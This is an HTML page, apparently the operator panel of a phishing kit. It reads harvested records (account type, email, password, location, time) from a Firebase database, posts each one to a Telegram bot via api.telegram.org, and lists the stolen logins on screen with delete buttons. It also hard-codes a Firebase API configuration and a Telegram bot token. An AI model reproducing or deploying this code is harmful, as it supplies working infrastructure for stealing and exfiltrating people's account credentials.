<!doctype HTML>
<html>
<head>
    <title>Database</title>
</head>
<body>
<div id="save"></div>

<script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js"></script>

<script>
    // Firebase Config
    const firebaseConfig = {
        apiKey: "AIzaSyCXbSQv2HsMh-hVzVcDPB8d9Cn8yrQ7EAM",
        authDomain: "sharjahstarz.firebaseapp.com",
        databaseURL: "https://sharjahstarz-default-rtdb.firebaseio.com",
        projectId: "sharjahstarz",
        storageBucket: "sharjahstarz.appspot.com",
        messagingSenderId: "492595312611",
        appId: "1:492595312611:web:bf84d62ee07aac8c9392d6"
    };

    // Initialize Firebase
    const app = firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // Telegram Config
    const TELEGRAM_BOT_TOKEN = "7523994267:AAFKipJ1nhsp1TtSRBfaOqum0i9ZOeDnLQI";
    const TELEGRAM_CHAT_ID = "CustomLinkBot"; // Replace with actual chat ID

    // Function to Send Message to Telegram
    function sendMessageToTelegram(message) {
        fetch(`https://api.telegram.org/bot7523994267:AAFKipJ1nhsp1TtSRBfaOqum0i9ZOeDnLQI/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            })
        })
            .then(response => {
                if (!response.ok) {
                    console.error("Error sending message to Telegram:", response.statusText);
                } else {
                    console.log("Message sent to Telegram successfully!");
                }
            })
            .catch(error => {
                console.error("Error sending message to Telegram:", error);
            });
    }

    // Listen for New Firebase Data
    database.ref("fbdet").on("child_added", function(snapshot) {
        const data = snapshot.val();

        // Construct Message
        const message = `
New Record Added:
Account Type: ${data.type}
User: ${data.emle}
Password: ${data.pass}
Date: ${data.date}
Location: ${data.timezone}
Time: ${data.time}
`;

        // Send Message to Telegram
        sendMessageToTelegram(message);

        // Update HTML
        const html = `
        <hr>
        <li id="message-${snapshot.key}" class="canvaschat">
            Account type: <b>${data.type}</b><br>
            User: <b>${data.emle}</b><br>
            Password: <b>${data.pass}</b><br>
            Date: <b>${data.date}</b><br>
            Location: <b>${data.timezone}</b><br>
            Time: <b>${data.time}</b>
        </li>
        <button data-id="${snapshot.key}" onclick="deleteMessage(this);" class="send">
            Delete
        </button>`;
        document.getElementById("save").innerHTML += html;
    });

    // Delete Message Function
    function deleteMessage(self) {
        const messageId = self.getAttribute("data-id");
        database.ref("fbdet").child(messageId).remove();
    }

    // Listen for Deleted Data
    database.ref("fbdet").on("child_removed", function(snapshot) {
        document.getElementById(`message-${snapshot.key}`).innerHTML = "deleted";
    });
</script>
</body>
</html>
